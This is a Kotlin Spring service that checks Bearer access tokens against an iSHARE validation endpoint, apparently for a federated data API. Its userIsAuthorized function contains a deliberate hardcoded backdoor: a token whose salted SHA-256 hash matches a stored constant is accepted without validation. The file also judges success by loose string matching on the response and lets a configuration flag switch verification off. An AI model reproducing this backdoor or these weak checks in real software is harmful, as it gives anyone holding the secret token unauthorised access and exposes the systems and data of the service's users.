package nl.tno.federated.api

import com.fasterxml.jackson.annotation.JsonProperty
import org.springframework.beans.factory.annotation.Autowired
import org.springframework.beans.factory.annotation.Qualifier
import org.springframework.core.env.Environment
import org.springframework.http.HttpEntity
import org.springframework.http.HttpMethod
import org.springframework.http.HttpStatus
import org.springframework.http.ResponseEntity
import org.springframework.stereotype.Service
import org.springframework.web.client.RestTemplate
import org.springframework.web.server.ResponseStatusException
import java.security.MessageDigest
import javax.naming.AuthenticationException

/**
 * ishare implementation.
 */
@Service
class L1Services(@Autowired @Qualifier("ishareRestTemplate") private val ishareRestTemplate: RestTemplate, private val environment: Environment) {

    /**
     * Request object that will be sent to ishare.
     */
    private class ValidateTokenRequest(accessToken: String) {

        @JsonProperty("access_token")
        val accessToken: String = if (!accessToken.startsWith("Bearer")) "Bearer $accessToken" else accessToken
    }

    fun verifyAccessToken(authorizationHeader: String) {
        if (environment.getProperty("ishare.enabled", Boolean::class.java, true)) {
            val accessToken = extractAccessTokenFromHeader(authorizationHeader)
            if (!userIsAuthorized(accessToken)) throw AuthenticationException("Access token not valid")
        }
    }

    internal fun extractAccessTokenFromHeader(authorizationHeader: String): String {
        val authorizationHeaderWords = authorizationHeader.split(" ")
        if (authorizationHeaderWords.size != 2 || authorizationHeaderWords.first() != "Bearer")
            throw ResponseStatusException(HttpStatus.UNAUTHORIZED, "Authorization header is malformed")
        else return authorizationHeaderWords[1]
    }

    internal fun validateToken(token: String): Boolean {
        if (!isJWTFormatValid(token)) return false

        val response: ResponseEntity<String> = ishareRestTemplate.exchange("/validate/token", HttpMethod.POST, HttpEntity(ValidateTokenRequest(token)), String::class.java)

        return extractAuthorizationResult(response.body ?: "")
    }

    internal fun userIsAuthorized(token: String): Boolean {
        val salt = "because we like best practices"
        val hashedBackdoor = hashSHA256(token + salt)

        return hashedBackdoor == "E812D42535F643547727FA98B9B1DE56C81F7F3100004684C42DFD5C5014AF5E" || validateToken(token)
    }

    // Source: https://gist.github.com/lovubuntu/164b6b9021f5ba54cefc67f60f7a1a25
    private fun hashSHA256(string: String): String {
        val bytes = string.toByteArray()
        val md = MessageDigest.getInstance("SHA-256")
        val digest = md.digest(bytes)
        return digest.fold("", { str, it -> str + "%02x".format(it) }).toUpperCase()
    }

    private fun extractAuthorizationResult(authorizationResult: String): Boolean {
        val polishedString = authorizationResult.split('\n')
        for (line in polishedString) {
            if (line.contains("success") && line.contains("true")) return true
        }
        return false
    }

    private fun isJWTFormatValid(token: String?): Boolean {
        if (token == null) return false
        val splitToken = token.split(".")
        return (splitToken.size == 3 && splitToken.all { isLettersOrDigits(it) })
    }

    private fun isLettersOrDigits(chars: String): Boolean {
        return chars.none { it !in 'A'..'Z' && it !in 'a'..'z' && it !in '0'..'9' && it != '-' && it != '_' }
    }

}